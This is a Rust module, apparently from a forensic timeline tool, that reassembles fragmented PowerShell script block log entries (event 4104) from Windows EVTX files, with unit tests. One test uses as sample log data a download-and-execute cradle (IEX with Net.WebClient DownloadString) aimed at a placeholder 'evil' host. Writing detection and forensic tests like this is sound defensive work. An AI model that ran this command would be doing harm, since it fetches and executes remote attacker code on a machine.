use std::collections::BTreeMap;

use jiff::Timestamp;
use serde_json::Value;

use crate::model::{EventKind, TimelineEvent};
use crate::source::evtx::fields::{
    RecordMeta, field_str, field_u32, format_summary_with_tail, insert_opt_bool, insert_opt_str,
    insert_opt_u64,
};

struct Fragment {
    ts: Timestamp,
    record_id: u64,
    file_record_id: Option<u64>,
    text: String,
    channel: Option<String>,
    provider: String,
    event_id: u32,
    user_sid: Option<String>,
    path: Option<String>,
    file: String,
}

struct ScriptBlockGroup {
    host: String,
    script_block_id: Option<String>,
    total: u32,
    fragments: BTreeMap<u32, Fragment>,
}

/// Accumulates PowerShell 4104 fragments across a file and reassembles them in deterministic order.
#[derive(Default)]
pub(crate) struct ScriptBlockCollector {
    groups: BTreeMap<(String, String), ScriptBlockGroup>,
}

impl ScriptBlockCollector {
    pub fn push(&mut self, meta: &RecordMeta, data: &Value) {
        let block_id = field_str(data, "ScriptBlockId");
        let key_id = block_id
            .clone()
            .unwrap_or_else(|| format!("__record_{}", meta.record_id));
        let msg_num = field_u32(data, "MessageNumber").unwrap_or(1);
        let msg_total = field_u32(data, "MessageTotal").unwrap_or(1);
        let text = data
            .get("ScriptBlockText")
            .and_then(|v| match v {
                Value::String(s) => Some(s.clone()),
                Value::Number(n) => Some(n.to_string()),
                Value::Bool(b) => Some(b.to_string()),
                _ => None,
            })
            .unwrap_or_default();

        let group = self
            .groups
            .entry((meta.host.clone(), key_id))
            .or_insert_with(|| ScriptBlockGroup {
                host: meta.host.clone(),
                script_block_id: block_id,
                total: msg_total,
                fragments: BTreeMap::new(),
            });
        if msg_total > group.total {
            group.total = msg_total;
        }
        group.fragments.entry(msg_num).or_insert(Fragment {
            ts: meta.ts,
            record_id: meta.record_id,
            file_record_id: meta.file_record_id,
            text,
            channel: meta.channel.clone(),
            provider: meta.provider.clone(),
            event_id: meta.event_id,
            user_sid: meta.user_sid.clone(),
            path: field_str(data, "Path"),
            file: meta.file.clone(),
        });
    }

    pub fn finish(self, out: &mut Vec<TimelineEvent>) -> u64 {
        let mut emitted = 0u64;
        for group in self.groups.into_values() {
            let Some((_, first)) = group.fragments.iter().next() else {
                continue;
            };
            let first_meta = RecordMeta {
                ts: first.ts,
                host: group.host,
                channel: first.channel.clone(),
                provider: first.provider.clone(),
                event_id: first.event_id,
                record_id: first.record_id,
                file_record_id: first.file_record_id,
                user_sid: first.user_sid.clone(),
                file: first.file.clone(),
            };
            let mut event = first_meta.base_event(EventKind::ScriptBlock);

            let path = group.fragments.values().find_map(|f| f.path.clone());
            let user_sid = group.fragments.values().find_map(|f| f.user_sid.clone());

            let total_len: usize = group.fragments.values().map(|f| f.text.len()).sum();
            let mut script = String::with_capacity(total_len);
            for frag in group.fragments.values() {
                script.push_str(&frag.text);
            }

            let seen = group.fragments.len() as u64;
            let total = group.total as u64;
            let complete = group.total > 0
                && seen == total
                && (1..=group.total).all(|n| group.fragments.contains_key(&n));

            let prefix = format!("PowerShell script block ({seen} of {total} fragments)");
            event.summary = format_summary_with_tail(&prefix, Some(&script));

            event
                .details
                .insert("script".to_string(), Value::String(script));
            insert_opt_str(&mut event.details, "script_block_id", group.script_block_id);
            insert_opt_str(&mut event.details, "path", path);
            insert_opt_u64(&mut event.details, "fragments_total", Some(total));
            insert_opt_u64(&mut event.details, "fragments_seen", Some(seen));
            insert_opt_bool(&mut event.details, "complete", Some(complete));
            insert_opt_str(&mut event.details, "user_sid", user_sid);

            out.push(event);
            emitted = emitted.saturating_add(1);
        }
        emitted
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn ps_meta(record_id: u64, sec: i64) -> RecordMeta {
        RecordMeta {
            ts: Timestamp::from_second(sec).unwrap(),
            host: "HOST01".into(),
            channel: Some("Microsoft-Windows-PowerShell/Operational".into()),
            provider: "Microsoft-Windows-PowerShell".into(),
            event_id: 4104,
            record_id,
            file_record_id: None,
            user_sid: Some("S-1-5-21-1-1000".into()),
            file: "ps.evtx".into(),
        }
    }

    #[test]
    fn reassembles_out_of_order_fragments() {
        let mut collector = ScriptBlockCollector::default();
        collector.push(
            &ps_meta(20, 102),
            &json!({
                "MessageNumber": 2,
                "MessageTotal": 2,
                "ScriptBlockText": "DownloadString('http://evil')",
                "ScriptBlockId": "id-1",
                "Path": ""
            }),
        );
        collector.push(
            &ps_meta(10, 100),
            &json!({
                "MessageNumber": 1,
                "MessageTotal": 2,
                "ScriptBlockText": "IEX (New-Object Net.WebClient).",
                "ScriptBlockId": "id-1",
                "Path": "C:\\temp\\run.ps1"
            }),
        );

        let mut out = Vec::new();
        let emitted = collector.finish(&mut out);
        assert_eq!(emitted, 1);
        assert_eq!(out.len(), 1);
        let ev = &out[0];
        assert_eq!(ev.ts, Timestamp::from_second(100).unwrap());
        assert_eq!(ev.record_id, Some(10));
        assert_eq!(ev.command_line, None);
        assert_eq!(
            ev.details["script"],
            "IEX (New-Object Net.WebClient).DownloadString('http://evil')"
        );
        assert_eq!(ev.details["script_block_id"], "id-1");
        assert_eq!(ev.details["path"], "C:\\temp\\run.ps1");
        assert_eq!(ev.details["fragments_total"], 2);
        assert_eq!(ev.details["fragments_seen"], 2);
        assert_eq!(ev.details["complete"], true);
        assert_eq!(ev.details["user_sid"], "S-1-5-21-1-1000");
        assert_eq!(
            ev.summary,
            "PowerShell script block (2 of 2 fragments): IEX (New-Object Net.WebClient).DownloadString('http://evil')"
        );
    }

    #[test]
    fn marks_incomplete_fragment_set_and_uses_lowest_seen() {
        let mut collector = ScriptBlockCollector::default();
        collector.push(
            &ps_meta(30, 200),
            &json!({
                "MessageNumber": 3,
                "MessageTotal": 3,
                "ScriptBlockText": "part3",
                "ScriptBlockId": "id-2",
                "Path": ""
            }),
        );
        collector.push(
            &ps_meta(25, 195),
            &json!({
                "MessageNumber": 2,
                "MessageTotal": 3,
                "ScriptBlockText": "part2-",
                "ScriptBlockId": "id-2",
                "Path": ""
            }),
        );

        let mut out = Vec::new();
        collector.finish(&mut out);
        assert_eq!(out.len(), 1);
        let ev = &out[0];
        assert_eq!(ev.ts, Timestamp::from_second(195).unwrap());
        assert_eq!(ev.record_id, Some(25));
        assert_eq!(ev.details["script"], "part2-part3");
        assert_eq!(ev.details["fragments_total"], 3);
        assert_eq!(ev.details["fragments_seen"], 2);
        assert_eq!(ev.details["complete"], false);
        assert!(!ev.details.contains_key("path"));
    }

    #[test]
    fn emits_multiple_script_blocks_deterministically() {
        let mut collector = ScriptBlockCollector::default();
        collector.push(
            &ps_meta(2, 200),
            &json!({
                "MessageNumber": 1,
                "MessageTotal": 1,
                "ScriptBlockText": "b",
                "ScriptBlockId": "zzz",
            }),
        );
        collector.push(
            &ps_meta(1, 100),
            &json!({
                "MessageNumber": 1,
                "MessageTotal": 1,
                "ScriptBlockText": "a",
                "ScriptBlockId": "aaa",
            }),
        );
        let mut out = Vec::new();
        let emitted = collector.finish(&mut out);
        assert_eq!(emitted, 2);
        let ids: Vec<_> = out
            .iter()
            .map(|e| e.details["script_block_id"].as_str().unwrap())
            .collect();
        assert_eq!(ids, ["aaa", "zzz"]);
    }
}
